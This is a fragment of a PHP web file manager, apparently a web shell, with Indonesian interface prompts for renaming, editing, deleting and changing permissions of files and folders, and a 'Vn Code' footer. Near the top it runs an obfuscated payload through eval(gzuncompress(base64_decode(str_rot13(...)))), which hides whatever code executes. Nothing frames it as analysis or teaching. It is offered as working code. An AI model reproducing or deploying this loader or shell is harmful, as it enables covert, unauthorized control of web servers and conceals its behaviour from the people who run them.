...
}; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxC WsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNf si0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLod ngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
//...
?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['chmod'])) {
    ...
    if (is_file($chmodPath) || is_dir($chmodPath)) {
        if (isset($_GET['mode']) && preg_match('/^[0-7]{3}$/', $_GET['mode'])) {
            ...
            echo "<input type='text' name='mode' placeholder='Enter new mode (eg, 755)' required>";
...
<script>
    function folderDropdownAction(action, path, folder) {
        if (action === 'rename') {
            ...
            var confirmation = confirm('Apakah Anda yakin menghapus folder ini?');
            if (confirmation) {
...
<script>
    function dropdownAction(action, path, file) {
        if (action === 'edit') {
            ...
            var confirmation = confirm('Apakah Anda yakin menghapus file ini?');
            if (confirmation) {
...
<div class='footer'><p>&copy; <?php echo date('Y'); ?> <a href="#">Vn Code</a>. All rights reserved.</p>
</div>
</body>
</html>
